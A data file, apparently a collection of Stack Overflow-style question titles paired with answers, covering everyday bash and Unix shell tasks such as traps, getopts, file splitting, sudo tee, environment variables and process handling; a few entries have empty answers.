    "Writing try catch finally in shell": "Based on your example, it looks like you are trying to do something akin to always deleting a temporary file, regardless of how a script exits. In Bash to do this try the trap builtin command to trap the EXIT signal.\n#!/bin/bash\n\ntrap 'rm tmp' EXIT\n\nif executeCommandWhichCanFail; then\n    mv output\nelse\n    mv log\n    exit 1 #Exit with failure\nfi\n\nexit 0 #Exit with success\nThe rm tmp statement in the trap is always executed when the script exits, so the file \"tmp\" will always tried to be deleted.\nInstalled traps can also be reset; a call to trap with only a signal name will reset the signal handler.\ntrap EXIT\nFor more details, see the bash manual page: man bash",
    "Linux: Which process is causing \"device busy\" when doing umount? [closed]": "Look at the lsof command (list open files) -- it can tell you which processes are holding what open. Sometimes it's tricky but often something as simple as sudo lsof | grep (your device name here) could do it for you.",
    "Bash: Copy named files recursively, preserving folder structure": "Have you tried using the --parents option? I don't know if OS X supports that, but that works on Linux.\ncp --parents src/prog.js images/icon.jpg /tmp/package\nIf that doesn't work on OS X, try\nrsync -R src/prog.js images/icon.jpg /tmp/package\nas aif suggested.",
    "How do I get the absolute directory of a file in Bash?": "To get the full path use:\nreadlink -f relative/path/to/file\nTo get the directory of a file:\ndirname relative/path/to/file\nYou can also combine the two:\ndirname $(readlink -f relative/path/to/file)\nIf readlink -f is not available on your system you can use this*:\nfunction myreadlink() {\n  (\n  cd \"$(dirname $1)\"         # or  cd \"${1%/*}\"\n  echo \"$PWD/$(basename $1)\" # or  echo \"$PWD/${1##*/}\"\n  )\n}\nNote that if you only need to move to a directory of a file specified as a relative path, you don't need to know the absolute path, a relative path is perfectly legal, so just use:\ncd $(dirname relative/path/to/file)\nif you wish to go back (while the script is running) to the original path, use pushd instead of cd, and popd when you are done.\n* While myreadlink above is good enough in the context of this question, it has some limitation relative to the readlink tool suggested above. For example it doesn't correctly follow a link to a file with different basename.",
    "Python 3 Online Interpreter / Shell [closed]": "Ideone supports Python 2.6 and Python 3",
    "How to remove space from string? [duplicate]": "The tools sed or tr will do this for you by swapping the whitespace for nothing\nsed 's/ //g'\ntr -d ' '\nExample:\n$ echo \"   3918912k \" | sed 's/ //g'\n3918912k",
    "Elegant way to search for UTF-8 files with BOM?": "",
    "Is there an Eclipse plugin to run system shell in the Console? [closed]": "It exists, and it's built into Eclipse! Go to the Remote Systems view, and you'll see an entry for \"Local\". Right-click \"Local Shells\" and choose \"Launch Shell.\"\nYou can't launch it directly from the project navigator. But you can right-click in the navigator and choose \"Show in Remote Systems view\". From there you can right-click the parent folder and choose \"Launch Shell.\"\nAptana also has a Terminal view, and a command to open the selected file in the terminal.",
    "Bash Shell Script - Check for a flag and grab its value": "You should read this getopts tutorial.\nExample with -a switch that requires an argument :\n#!/bin/bash\n\nwhile getopts \":a:\" opt; do\n  case $opt in\n    a)\n      echo \"-a was triggered, Parameter: $OPTARG\" >&2\n      ;;\n    \\?)\n      echo \"Invalid option: -$OPTARG\" >&2\n      exit 1\n      ;;\n    :)\n      echo \"Option -$OPTARG requires an argument.\" >&2\n      exit 1\n      ;;\n  esac\ndone\nLike greybot said(getopt != getopts) :\nThe external command getopt(1) is never safe to use, unless you know it is GNU getopt, you call it in a GNU-specific way, and you ensure that GETOPT_COMPATIBLE is not in the environment. Use getopts (shell builtin) instead, or simply loop over the positional parameters.",
    "How to split a file and keep the first line in each of the pieces?": "This is robhruska's script cleaned up a bit:\ntail -n +2 file.txt | split -l 4 - split_\nfor file in split_*\ndo\n    head -n 1 file.txt > tmp_file\n    cat \"$file\" >> tmp_file\n    mv -f tmp_file \"$file\"\ndone\nI removed wc, cut, ls and echo in the places where they're unnecessary. I changed some of the filenames to make them a little more meaningful. I broke it out onto multiple lines only to make it easier to read.\nIf you want to get fancy, you could use mktemp or tempfile to create a temporary filename instead of using a hard coded one.\nEdit\nUsing GNU split it's possible to do this:\nsplit_filter () { { head -n 1 file.txt; cat; } > \"$FILE\"; }; export -f split_filter; tail -n +2 file.txt | split --lines=4 --filter=split_filter - split_\nBroken out for readability:\nsplit_filter () { { head -n 1 file.txt; cat; } > \"$FILE\"; }\nexport -f split_filter\ntail -n +2 file.txt | split --lines=4 --filter=split_filter - split_\nWhen --filter is specified, split runs the command (a function in this case, which must be exported) for each output file and sets the variable FILE, in the command's environment, to the filename.\nA filter script or function could do any manipulation it wanted to the output contents or even the filename. An example of the latter might be to output to a fixed filename in a variable directory: > \"$FILE/data.dat\" for example.",
    "Linux Shell Script For Each File in a Directory Grab the filename and execute a program": "bash:\nfor f in *.xls ; do xls2csv \"$f\" \"${f%.xls}.csv\" ; done",
    "Execute a shell function with timeout": "As Douglas Leeder said you need a separate process for timeout to signal to. Workaround by exporting function to subshells and running subshell manually.\nexport -f echoFooBar\ntimeout 10s bash -c echoFooBar",
    "Total size of the contents of all the files in a directory [closed]": "If you want the 'apparent size' (that is the number of bytes in each file), not size taken up by files on the disk, use the -b or --bytes option (if you got a Linux system with GNU coreutils):\n% du -sbh <directory>",
    "How to declare 2D array in bash": "You can simulate them for example with hashes, but need care about the leading zeroes and many other things. The next demonstration works, but it is far from optimal solution.\n#!/bin/bash\ndeclare -A matrix\nnum_rows=4\nnum_columns=5\n\nfor ((i=1;i<=num_rows;i++)) do\n    for ((j=1;j<=num_columns;j++)) do\n        matrix[$i,$j]=$RANDOM\n    done\ndone\n\nf1=\"%$((${#num_rows}+1))s\"\nf2=\" %9s\"\n\nprintf \"$f1\" ''\nfor ((i=1;i<=num_rows;i++)) do\n    printf \"$f2\" $i\ndone\necho\n\nfor ((j=1;j<=num_columns;j++)) do\n    printf \"$f1\" $j\n    for ((i=1;i<=num_rows;i++)) do\n        printf \"$f2\" ${matrix[$i,$j]}\n    done\n    echo\ndone\nthe above example creates a 4x5 matrix with random numbers and print it transposed, with the example result\n           1         2         3         4\n 1     18006     31193     16110     23297\n 2     26229     19869      1140     19837\n 3      8192      2181     25512      2318\n 4      3269     25516     18701      7977\n 5     31775     17358      4468     30345\nThe principle is: Creating one associative array where the index is an string like 3,4. The benefits:\nit's possible to use for any-dimension arrays ;) like: 30,40,2 for 3 dimensional.\nthe syntax is close to \"C\" like arrays ${matrix[2,3]}",
    "How to invoke a Linux shell command from Java [duplicate]": "exec does not execute a command in your shell\ntry\nProcess p = Runtime.getRuntime().exec(new String[]{\"csh\",\"-c\",\"cat /home/narek/pk.txt\"});\ninstead.\nEDIT:: I don't have csh on my system so I used bash instead. The following worked for me\nProcess p = Runtime.getRuntime().exec(new String[]{\"bash\",\"-c\",\"ls /home/XXX\"});",
    "How to restrict SSH users to a predefined set of commands after login?": "You can also restrict keys to permissible commands (in the authorized_keys file).\nI.e. the user would not log in via ssh and then have a restricted set of commands but rather would only be allowed to execute those commands via ssh (e.g. \"ssh somehost bin/showlogfile\")",
    "Bash Scripting - How to set the group that new files will be created with?": "There are a couple ways to do this:\nYou can change the default group for all files created in a particular directory by setting the setgid flag on the directory (chmod g+s <dir>). New files in the directory will then be created with the group of the directory (set using chgrp <group> <dir>). This applies to any program that creates files in the directory.\nNote that this is automagically inherited for new subdirectories (as of Linux 3.10). However, if subdirectories were already present, this change won't be applied to them. Assuming that the subdirectories already have the correct group, the setgid flag can be added to them with: find . -type d -exec chmod g+s {} \\; (suggested by Maciej Krawczyk in the comments)\nIf the setgid flag is not set, then the default group will be set to the current group id of the creating process. Although this can be set using the newgrp command, that creates a new shell that is difficult to use within a shell script. If you want to execute a particular command (or set of commands) with the changed group, use the command sg <group> <command>.\nsg is not a POSIX standard command but is available on Linux.",
    "Is there a way to use shell_exec without waiting for the command to complete?": "",
    "Count line lengths in file using command line tools": "This\ncounts the line lengths using awk, then\nsorts the (numeric) line lengths using sort -n and finally\ncounts the unique line length values uniq -c.\n$ awk '{print length}' input.txt | sort -n | uniq -c\n      1 1\n      2 2\n      3 4\n      1 5\n      2 6\n      2 7\nIn the output, the first column is the number of lines with the given length, and the second column is the line length.",
    "find -mtime files older than 1 hour [duplicate]": "What about -mmin?\nfind /var/www/html/audio -daystart -maxdepth 1 -mmin +59 -type f -name \"*.mp3\" \\\n    -exec rm -f {} \\;\nFrom man find:\n-mmin n\n        File's data was last modified n minutes ago.\nAlso, make sure to test this first!\n... -exec echo rm -f '{}' \\;\n          ^^^^ Add the 'echo' so you just see the commands that are going to get\n               run instead of actual trying them first.",
    "How to mark a build unstable in Jenkins when running shell scripts": "",
    "Global environment variables in a shell script": "Run your script with .\n. myscript.sh\nThis will run the script in the current shell environment.\nexport governs which variables will be available to new processes, so if you say\nFOO=1\nexport BAR=2\n./runScript.sh\nthen $BAR will be available in the environment of runScript.sh, but $FOO will not.",
    "Why sudo cat gives a Permission denied but sudo vim works fine? [duplicate]": "As @geekosaur explained, the shell does the redirection before running the command. When you type this:\nsudo foo >/some/file\nYour current shell process makes a copy of itself that first tries to open /some/file for writing, then if that succeeds it makes that file descriptor its standard output, and only if that succeeds does it execute sudo. This is failing at the first step.\nIf you're allowed (sudoer configs often preclude running shells), you can do something like this:\nsudo bash -c 'foo >/some/file'\nBut I find a good solution in general is to use | sudo tee instead of > and | sudo tee -a instead of >>. That's especially useful if the redirection is the only reason I need sudo in the first place; after all, needlessly running processes as root is precisely what sudo was created to avoid. And running echo as root is just silly.\necho '[archlinuxfr]' | sudo tee -a /etc/pacman.conf >/dev/null\necho 'Server = http://repo.archlinux.fr/$arch' | sudo tee -a /etc/pacman.conf >/dev/null\necho ' ' | sudo tee -a /etc/pacman.conf >/dev/null\nI added > /dev/null on the end because tee sends its output to both the named file and its own standard output, and I don't need to see it on my terminal. (The tee command acts like a \"T\" connector in a physical pipeline, which is where it gets its name.) And I switched to single quotes ('...') instead of doubles (\"...\") so that everything is literal and I didn't have to put a backslash in front of the $ in $arch. (Without the quotes or backslash, $arch would get replaced by the value of the shell parameter arch, which probably doesn't exist, in which case the $arch is replaced by nothing and just vanishes.)\nSo that takes care of writing to files as root using sudo. Now for a lengthy digression on ways to output newline-containing text in a shell script. :)\nTo BLUF it, as they say, my preferred solution would be to just feed a here-document into the above sudo tee command; then there is no need for cat or echo or printf or any other commands at all. The single quotation marks have moved to the sentinel introduction <<'EOF', but they have the same effect there: the body is treated as literal text, so $arch is left alone:\nsudo tee -a /etc/pacman.conf >/dev/null <<'EOF'\n[archlinuxfr]\nServer = http://repo.archlinux.fr/$arch\n\nEOF\nBut while that's how I'd do it, there are alternatives. Here are a few:\nYou can stick with one echo per line, but group all of them together in a subshell, so you only have to append to the file once:\n(echo '[archlinuxfr]'\n echo 'Server = http://repo.archlinux.fr/$arch'\n echo ' ') | sudo tee -a /etc/pacman.conf >/dev/null\nIf you add -e to the echo (and you're using a shell that supports that non-POSIX extension), you can embed newlines directly into the string using \\n:\n# NON-POSIX - NOT RECOMMENDED\necho -e '[archlinuxfr]\\nServer = http://repo.archlinux.fr/$arch\\n ' | \n  sudo tee -a /etc/pacman.conf >/dev/null\nBut as it says above, that's not POSIX-specified behavior; your shell might just echo a literal -e followed by a string with a bunch of literal \\ns instead. The POSIX way of doing that is to use printf instead of echo; it automatically treats its argument like echo -e does, but doesn't automatically append a newline at the end, so you have to stick an extra \\n there, too:\nprintf '[archlinuxfr]\\nServer = http://repo.archlinux.fr/$arch\\n \\n' | \n  sudo tee -a /etc/pacman.conf >/dev/null\nWith either of those solutions, what the command gets as an argument string contains the two-character sequence \\n, and it's up to the command program itself (the code inside printf or echo) to translate that into a newline. In many modern shells, you have the option of using ANSI quotes $'...', which will translate sequences like \\n into literal newlines before the command program ever sees the string. That means such strings work with any command whatsoever, including plain old -e-less echo:\necho $'[archlinuxfr]\\nServer = http://repo.archlinux.fr/$arch\\n ' | \n  sudo tee -a /etc/pacman.conf >/dev/null\nBut, while more portable than echo -e, ANSI quotes are still a non-POSIX extension.\nAnd again, while those are all options, I prefer the straight tee <<EOF solution above.",
    "Is mixing getopts with positional parameters possible?": "I wanted to do something similar to the OP, and I found the relevant information I required here and here\nEssentially if you want to do something like:\nscript.sh [options] ARG1 ARG2\nThen get your options like this:\nwhile getopts \"h:u:p:d:\" flag; do\ncase \"$flag\" in\n    h) HOSTNAME=$OPTARG;;\n    u) USERNAME=$OPTARG;;\n    p) PASSWORD=$OPTARG;;\n    d) DATABASE=$OPTARG;;\nesac\ndone\nAnd then you can get your positional arguments like this:\nARG1=${@:$OPTIND:1}\nARG2=${@:$OPTIND+1:1}\nMore information and details are available through the link above.",
    "How can I make bash tab completion behave like vim tab completion and cycle through matching matches?": "By default TAB is bound to the complete readline command. Your desired behavior would be menu-complete instead. You can change your readlines settings by editing ~/.inputrc. To rebind TAB, add this line:\nTAB: menu-complete\nFor more details see the READLINE section in man bash.",
    "How to load ~/.bash_profile when entering bash from within zsh?": "Open ~/.zshrc, and at the very bottom of the file, add the following:\nif [ -f ~/.bash_profile ]; then \n    . ~/.bash_profile;\nfi\nEvery time you open the terminal, it will load whatever is defined in ~/.bash_profile (if the file exist). With that, you can keep your custom settings for zsh (colors, and etc). And you get to keep your custom shell settings in .bash_profile file.\nThis is much cleaner than using bash -l IMO.\nIf you prefer putting your settings in .bashrc, or .bash_login, or .profile , you can do the same for them.\nSimilarly, you could also move the common profile settings to separate file, i.e. .my_common_profile, and add the following to both .bash_profile and .zshrc:\nif [ -f ~/.my_common_profile ]; then \n    . ~/.my_common_profile;\nfi",
    "How to npm install global not as root?": "Many setups already expect binaries to be found in ~/.local/bin/. So this answer follows that convention. Other files will get installed to ~/.local/lib/node_modules/.\n1. Configure npm\nRun:\nnpm config set prefix '~/.local/'\nThis modifies ~/.npmrc to include this line:\nprefix=~/.local/\n2. Make sure ~/.local/bin exists and is in your PATH\nRun echo \"$PATH\" to have a look at your path. If it does not include ~/.local/bin/ already, you will need to configure your system to include it.\nmkdir -p ~/.local/bin\necho 'export PATH=\"$HOME/.local/bin/:$PATH\"' >> ~/.bashrc\nReplace .bashrc with the configuration file of the shell that you are using.\n3. Install packages globally\nnpm install -g packagename",
    "Print execution time of a shell command": "time is a built-in command in most shells that writes execution time information to the tty.\nYou could also try something like\nstart_time=`date +%s`\n<command-to-execute>\nend_time=`date +%s`\necho execution time was `expr $end_time - $start_time` s.\nOr in bash:\nstart_time=`date +%s`\n<command-to-execute> && echo run time is $(expr `date +%s` - $start_time) s",
    "Generate a random filename in unix shell": "Assuming you are on a linux, the following should work:\ncat /dev/urandom | tr -cd 'a-f0-9' | head -c 32\nThis is only pseudo-random if your system runs low on entropy, but is (on linux) guaranteed to terminate. If you require genuinely random data, cat /dev/random instead of /dev/urandom. This change will make your code block until enough entropy is available to produce truly random output, so it might slow down your code. For most uses, the output of /dev/urandom is sufficiently random.\nIf you on OS X or another BSD, you need to modify it to the following:\ncat /dev/urandom | env LC_CTYPE=C tr -cd 'a-f0-9' | head -c 32",
    "How do I create an array in Unix shell scripting?": "The following code creates and prints an array of strings in shell:\n#!/bin/bash\narray=(\"A\" \"B\" \"ElementC\" \"ElementE\")\nfor element in \"${array[@]}\"\ndo\n    echo \"$element\"\ndone\n\necho\necho \"Number of elements: ${#array[@]}\"\necho\necho \"${array[@]}\"\nResult:\nA\nB\nElementC\nElementE\n\nNumber of elements: 4\n\nA B ElementC ElementE",
    "How can I list the files in a zip archive without decompressing it?": "Use unzip with -l option:\nunzip -l file.zip",
    "How to properly nest Bash backticks": "Use $(commands) instead:\n$ echo \"hello1-$(echo hello2-$(echo hello3-$(echo hello4)))\"\nhello1-hello2-hello3-hello4\n$(commands) does the same thing as backticks, but you can nest them.\nYou may also be interested in Bash range expansions:\necho hello{1..10}\nhello1 hello2 hello3 hello4 hello5 hello6 hello7 hello8 hello9 hello10",
    "How to get file creation date/time in Bash/Debian?": "Unfortunately your quest won't be possible in general, as there are only 3 distinct time values stored for each of your files as defined by the POSIX standard (see Base Definitions section 4.8 File Times Update)\nEach file has three distinct associated timestamps: the time of last data access, the time of last data modification, and the time the file status last changed. These values are returned in the file characteristics structure struct stat, as described in <sys/stat.h>.\nEDIT: As mentioned in the comments below, depending on the filesystem used metadata may contain file creation date. Note however storage of information like that is non standard. Depending on it may lead to portability problems moving to another filesystem, in case the one actually used somehow stores it anyways.",
    "How to check if an URL exists with the shell and probably curl?": "Using --fail will make the exit status nonzero on a failed request. Using --head will avoid downloading the file contents, since we don't need it for this check. Using --silent will avoid status or errors from being emitted by the check itself.\nif curl --output /dev/null --silent --head --fail \"$url\"; then\n  echo \"URL exists: $url\"\nelse\n  echo \"URL does not exist: $url\"\nfi\nIf your server refuses HEAD requests, an alternative is to request only the first byte of the file:\nif curl --output /dev/null --silent --fail -r 0-0 \"$url\"; then",
    "Shell script to send email [duplicate]": "Yes it works fine and is commonly used:\n$ echo \"hello world\" | mail -s \"a subject\" someone@somewhere.com",
    "How to kill childprocess in nodejs?": "If you can use node's built in child_process.spawn, you're able to send a SIGINT signal to the child process:\nvar proc = require('child_process').spawn('mongod');\nproc.kill('SIGINT');\nAn upside to this is that the main process should hang around until all of the child processes have terminated.",
    "Randomly shuffling lines in Linux / Bash": "You should use shuf command =)\ncat file1 file2 | shuf\nOr with Perl :\ncat file1 file2 | perl -MList::Util=shuffle -wne 'print shuffle <>;'",
    "How to set environment variables from .env file": "If your lines are valid, trusted shell but for the export command\nThis requires appropriate shell quoting. It's thus appropriate if you would have a line like foo='bar baz', but not if that same line would be written foo=bar baz\nset -a # automatically export all variables\nsource .env\nset +a\nIf your lines are not valid shell\nThe below reads key/value pairs, and does not expect or honor shell quoting.\nwhile IFS== read -r key value; do\n  printf -v \"$key\" %s \"$value\" && export \"$key\"\ndone <.env",
    "How can I check if PostgreSQL is installed or not via Linux script?": "What about trying the which command?\nIf you were to run which psql and Postgres is not installed there appears to be no output. You just get the terminal prompt ready to accept another command:\n> which psql\n>\nBut if Postgres is installed you'll get a response with the path to the location of the Postgres install:\n> which psql\n/opt/boxen/homebrew/bin/psql\nLooking at man which there also appears to be an option that could help you out:\n-s      No output, just return 0 if any of the executables are found, or\n        1 if none are found.\nSo it seems like as long as whatever scripting language you're using can can execute a terminal command you could send which -s psql and use the return value to determine if Postgres is installed. From there you can print that result however you like.\nI do have postgres installed on my machine so I run the following\n> which -s psql\n> echo $?\n0\nwhich tells me that the command returned 0, indicating that the Postgres executable was found on my machine.\nHere's the information about using echo $?",
    "How to embed bash script directly inside a git alias": "git config --global alias.diffall '!sh diffall.sh'\nThis is redundant in one way. If you are going to add 'diffall.sh' into your $PATH anyway, why not save it as 'git-diffall', and save yourself from declaring an alias. Yes, \"git diffall\" will run it.",
    "Which shell I am using in mac": "To see what shell is currently running - which may or may not be your default shell - use:\n# Prints something like '/bin/ksh' or '-zsh'\n# See bottom section if you always need the full path.\nps -o comm= $$\nThe above assumes that the running shell is a POSIX-compatible shell. If the running shell is PowerShell, replace $$ with $PID, which will tell you the full path even if PowerShell is also the default shell. If you use\n(Get-Process -Id $PID).Path instead, you'll get the full path with symlinks resolved, if any.\nTo see what shell is your default shell, run:\necho $SHELL\nIf the currently running shell is PowerShell: $env:SHELL\nIf you need to know the full path of the currently running shell:\nIf the current shell was launched directly by Terminal.app (or iTerm2), it is a login shell launched via the login utility, which causes the current shell process to self-report its binary abstractly as -<binary-filename>, e.g. -zsh; that is, you don't get the full path of the binary underlying the shell process.\nIf always obtaining the full path is required - e.g. if you want to distinguish the system Bash /bin/bash from a later version installed via Homebrew - you can use the following command line:\n(bin=\"$(ps -o comm= $$)\"; expr \"$bin\" : '\\(-\\)' >/dev/null && bin=\"$(ps -o command= $PPID | grep -Eo ' SHELL=[^ ]+' | cut -f 2- -d =)\"; [ -n \"$bin\" ] && echo \"$bin\" || echo \"$SHELL\")",
    "Export from sqlite to csv using shell script": "Instead of the dot commands, you could use sqlite3 command options:\nsqlite3 -header -csv my_db.db \"select * from my_table;\" > out.csv\nThis makes it a one-liner.\nAlso, you can run a sql script file:\nsqlite3 -header -csv my_db.db < my_script.sql > out.csv\nUse sqlite3 -help to see the list of available options.",
    "How to wait for an open port with netcat?": "You can't set netcat to wait until some port is open, so you have to add part for waiting before next check is made. Try this:\n#!/bin/bash\n\necho \"Waiting jenkins to launch on 8080...\"\n\nwhile ! nc -z localhost 8080; do   \n  sleep 0.1 # wait for 1/10 of the second before check again\ndone\n\necho \"Jenkins launched\"",
    "How do file descriptors work?": "File descriptors 0, 1 and 2 are for stdin, stdout and stderr respectively.\nFile descriptors 3, 4, .. 9 are for additional files. In order to use them, you need to open them first. For example:\nexec 3<> /tmp/foo  #open fd 3.\necho \"test\" >&3\nexec 3>&- #close fd 3.\nFor more information take a look at Advanced Bash-Scripting Guide: Chapter 20. I/O Redirection.",
    "How to find processes based on port and kill them all? [duplicate]": "The problem with ps -efl | grep PORT_NUMBER is that PORT_NUMBER may match other columns in the output of ps as well (date, time, pid, ...). A potential killing spree if run by root!\nI would do this instead :\nPORT_NUMBER=1234\nlsof -i tcp:${PORT_NUMBER} | awk 'NR!=1 {print $2}' | xargs kill \nBreakdown of command\n(lsof -i tcp:${PORT_NUMBER}) -- list all processes that is listening on that tcp port\n(awk 'NR!=1 {print $2}') -- ignore first line, print second column of each line\n(xargs kill) -- pass on the results as an argument to kill. There may be several.",
    "Insert multiple lines into a file after specified pattern using shell script": "Another sed,\nsed '/cdef/r add.txt' input.txt\ninput.txt:\nabcd\naccd\ncdef\nline\nweb\nadd.txt:\nline1\nline2\nline3\nline4\nTest:\nsat:~# sed '/cdef/r add.txt' input.txt\nabcd\naccd\ncdef\nline1\nline2\nline3\nline4\nline\nweb\nIf you want to apply the changes in input.txt file. Then, use -i with sed.\nsed -i '/cdef/r add.txt' input.txt\nIf you want to use a regex as an expression you have to use the -E tag with sed.\nsed -E '/RegexPattern/r add.txt' input.txt",
    "How to run command-line SQLite query and exit?": "Just include the command in quotes after the database file argument.\nFor example, the following creates a table called abc:\nsqlite3 test.db 'create table abc (col0 int)'",
    "Unit testing for shell scripts": "UPDATE 2019-03-01: My preference is bats now. I have used it for a few years on small projects. I like the clean, concise syntax. I have not integrated it with CI/CD frameworks, but its exit status does reflect the overall success/failure of the suite, which is better than shunit2 as described below.\nPREVIOUS ANSWER:\nI'm using shunit2 for shell scripts related to a Java/Ruby web application in a Linux environment. It's been easy to use, and not a big departure from other xUnit frameworks.\nI have not tried integrating with CruiseControl or Hudson/Jenkins, but in implementing continuous integration via other means I've encountered these issues:\nExit status: When a test suite fails, shunit2 does not use a nonzero exit status to communicate the failure. So you either have to parse the shunit2 output to determine pass/fail of a suite, or change shunit2 to behave as some continuous integration frameworks expect, communicating pass/fail via exit status.\nXML logs: shunit2 does not produce a JUnit-style XML log of results.",
    "Why doesn't a shell get variables exported by a script run in a subshell?": "If you are executing your files like sh 1.sh or ./1.sh Then you are executing it in a sub-shell.\nIf you want the changes to be made in your current shell, you could do:\n. 1.sh\n# OR\nsource 1.sh\nPlease consider going through the reference-documentation.\n\"When a script is run using source [or .] it runs within the existing shell, any variables created or modified by the script will remain available after the script completes. In contrast if the script is run just as filename, then a separate subshell (with a completely separate set of variables) would be spawned to run the script.\"",
    "rsync not synchronizing .htaccess file": "This is due to the fact that * is by default expanded to all files in the current working directory except the files whose name starts with a dot. Thus, rsync never receives these files as arguments.\nYou can pass . denoting current working directory to rsync:\nrsync -av . server2::sharename/B\nThis way rsync will look for files to transfer in the current working directory as opposed to looking for them in what * expands to.\nAlternatively, you can use the following command to make * expand to all files including those which start with a dot:\nshopt -s dotglob\nSee also shopt manpage.",
    "Unix standard directory to put custom executables or scripts? [closed]": "/usr/local/bin exists precisely for this purpose: for system-wide installation. For your own private use, ~/bin is the de facto standard.\nIf you want to keep each binary in its own subdirectory, you can do that, and add a symlink to a directory already in your PATH. So, for example:\ncurl -o $HOME/downloads/fnord http://fnord.example.com/script.exe\nln -s $HOME/downloads/fnord $HOME/bin/\nThis assumes $HOME/bin is in your PATH.\nThere are tools like stow which do this -- and much more -- behind the scenes for you.",
    "Best way to make a shell script daemon?": "Just backgrounding your script (./myscript &) will not daemonize it. See http://www.faqs.org/faqs/unix-faq/programmer/faq/, section 1.7, which describes what's necessary to become a daemon. You must disconnect it from the terminal so that SIGHUP does not kill it. You can take a shortcut to make a script appear to act like a daemon;\nnohup ./myscript 0<&- &>/dev/null &\nwill do the job. Or, to capture both stderr and stdout to a file:\nnohup ./myscript 0<&- &> my.admin.log.file &\nRedirection explained (see bash redirection)\n0<&- closes stdin\n&> file sends stdout and stderr to a file\nHowever, there may be further important aspects that you need to consider. For example:\nYou will still have a file descriptor open to the script, which means that the directory it's mounted in would be unmountable. To be a true daemon you should chdir(\"/\") (or cd / inside your script), and fork so that the parent exits, and thus the original descriptor is closed.\nPerhaps run umask 0. You may not want to depend on the umask of the caller of the daemon.\nFor an example of a script that takes all of these aspects into account, see Mike S' answer.",
    "Execute a shell script in current shell with sudo permission": "I'm not sure if this breaks any rules but\nsudo bash script.sh\nseems to work for me.",
    "Remove part of path on Unix": "If you wanted to remove a certain NUMBER of path components, you should use cut with -d'/'. For example, if path=/home/dude/some/deepish/dir:\nTo remove the first two components:\n# (Add 2 to the number of components to remove to get the value to pass to -f)\necho $path | cut -d'/' -f4-\n# output:\n# some/deepish/dir\nTo keep the first two components:\necho $path | cut -d'/' -f-3\n# output:\n# /home/dude\nTo remove the last two components (rev reverses the string):\necho $path | rev | cut -d'/' -f4- | rev\n# output:\n# /home/dude/some\nTo keep the last three components:\necho $path | rev | cut -d'/' -f-3 | rev\n# output:\n# some/deepish/dir\nOr, if you want to remove everything before a particular component, sed would work:\necho $path | sed 's/.*\\(some\\)/\\1/g'\n# output:\n# some/deepish/dir\nOr after a particular component:\necho $path | sed 's/\\(dude\\).*/\\1/g'\n# output:\n# /home/dude\nIt's even easier if you don't want to keep the component you're specifying:\necho $path | sed 's/some.*//g'\n# output:\n# /home/dude/\nAnd if you want to be consistent you can match the trailing slash too:\necho $path | sed 's/\\/some.*//g'\n# output:\n# /home/dude\nOf course, if you're matching several slashes, you should switch the sed delimiter:\necho $path | sed 's!/some.*!!g'\n# output:\n# /home/dude\nNote that these examples all use absolute paths, you'll have to play around to make them work with relative paths.",
    "Run bash command on Jenkins pipeline": "",
    "Create file with contents from shell script": "Use a \"here document\":\ncat > foo.conf << EOF\nNameVirtualHost 127.0.0.1\n\n# Default\n<VirtualHost 127.0.0.1>\nServerName localhost\nDocumentRoot \"C:/wamp/www\"\n</VirtualHost>\nEOF",
    "Unix shell script to truncate a large file": "Just to add another answer,\n: > filename\n: is a no-op in bash (POSIX-compliant), so this essentially just opens the file for writing (which of course truncates the file) and then immediately closes it.\nEDIT: as shellter commented, you don't actually need a command to go along with the redirection:\n$ echo foo > foo.txt\n$ cat foo.txt\nfoo\n$ > foo.txt\n$ cat foo.txt\n$\nA simple redirection all by itself will clear the file.",
    "How to file split at a line number [closed]": "file_name=test.log\n\n# set first K lines:\nK=1000\n\n# line count (N): \nN=$(wc -l < $file_name)\n\n# length of the bottom file:\nL=$(( $N - $K ))\n\n# create the top of file: \nhead -n $K $file_name > top_$file_name\n\n# create bottom of file: \ntail -n $L $file_name > bottom_$file_name\nAlso, on second thought, split will work in your case, since the first split is larger than the second. Split puts the balance of the input into the last split, so\nsplit -l 300000 file_name\nwill output xaa with 300k lines and xab with 100k lines, for an input with 400k lines.",
    "Can GNU make handle filenames with spaces?": "The bug #712 suggests that make does not handle names with spaces. Nowhere, never.\nI found a blog post saying it's partially implemented by escaping the spaces with \\ (\\\\ seems to be typo or formatting artefact), but:\nIt does not work in any functions except $(wildcard).\nIt does not work when expanding lists of names from variables, which includes the special variables $?, $^ and $+ as well as any user-defined variable. Which in turn means that while $(wildcard) will match correct files, you won't be able to interpret the result anyway.\nSo with explicit or very simple pattern rules you can get it to work, but beyond that you are out of luck. You'll have to look for some other build system that does support spaces. I am not sure whether jam/bjam does, scons, waf, ant, nant and msbuild all should work.",
    "How do I merge one directory into another using Bash?": "cp -RT source/ destination/\nAll files and directories in source will end up in destination. For example, source/file1 will be copied to destination/file1.\nThe -T flag stops source/file1 from being copied to destination/source/file1 instead. (Unfortunately, cp on macOS does not support the -T flag.)",
    "Counting number of characters in a file through shell script": "This will do it for counting bytes in file:\nwc -c filename\nIf you want only the count without the filename being repeated in the output:\nwc -c < filename\nThis will count characters in multibyte files (Unicode etc.):\nwc -m filename\n(as shown in S\u00e9bastien's answer).",
    "How to check if ssh-agent is already running in bash?": "To check if ssh-agent is already running in bash?\nHere's what works for me:\nif ps -p $SSH_AGENT_PID > /dev/null\nthen\n   echo \"ssh-agent is already running\"\n   # Do something knowing the pid exists, i.e. the process with $PID is running\nelse\neval `ssh-agent -s`\nfi\nThis was taken from here",
    "Bash autocompletion in Emacs shell-mode": "I know this question is three years old, but it's something that I've also been interested in solving. A Web search directed me to a piece of elisp that makes Emacs use bash for completion in shell mode. It works for me, in any case.\nCheck it out at https://github.com/szermatt/emacs-bash-completion .",
    "Exporting a function in shell": "The export -f feature is specific to Bash:\nparent\n#!/bin/bash\nplus1 () { echo $(($1 + 1)); }\necho $(plus1 8)\nexport -f plus1\n./child 14 21\nchild\n#!/bin/bash\necho $(plus1 $(($1 * $2)) )",
    "Several ways to call a windows batch file from another one or from prompt. Which one in which case?": "The batch file will be executed by the current cmd.exe instance (or a new cmd.exe instance if, for instance, double-clicked in Explorer).\nSame as #1, only has an effect when used inside a batch/cmd file. In a batch file, without 'call', the parent batch file ends and control passes to the called batch file; with 'call' runs the child batch file, and the parent batch file continues with statements following call.\nRuns the batch file in a new cmd.exe instance.\nStart will run the batch file in a new cmd.exe instance in a new window, and the caller will not wait for completion.",
